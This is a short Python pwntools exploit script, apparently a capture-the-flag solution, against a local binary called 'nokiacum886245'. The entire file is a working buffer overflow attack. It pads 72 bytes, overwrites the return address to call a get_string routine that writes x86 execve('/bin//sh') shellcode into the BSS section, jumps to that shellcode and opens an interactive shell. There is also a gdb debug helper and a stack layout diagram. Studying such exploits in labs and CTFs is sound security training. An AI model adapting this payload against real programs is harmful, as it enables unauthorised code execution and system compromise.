from pwn import *


intro='''

|...  | shellcode  <--BSS_DATA
|...  | Return     <- BSS_DATA
|EIP  | get_string
|EBP  | |
|     | 72
|     | |
|     | |
| ... | s
ESP

'''


def debug(r):
	gdb.attach(r,'''
	break *0x08048740
	break *0x080487fe
	break *0x080487FF
	c	
	''')

def pwn():
	print intro
	r=process("./nokiacum886245")
	#debug(r)
	padding =72

	shellcode='\x31\xD2\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80'
	BSS_DATA=0x8049180
	get_string=0x0804862D
	EBP="A"*4
	pl="A"*(padding)+EBP+p32(get_string)+p32(BSS_DATA)+p32(BSS_DATA)
	r.sendline("")
	print r.recvuntil(':')
	r.sendline(pl)
	r.sendline(shellcode)
	r.interactive()

pwn()
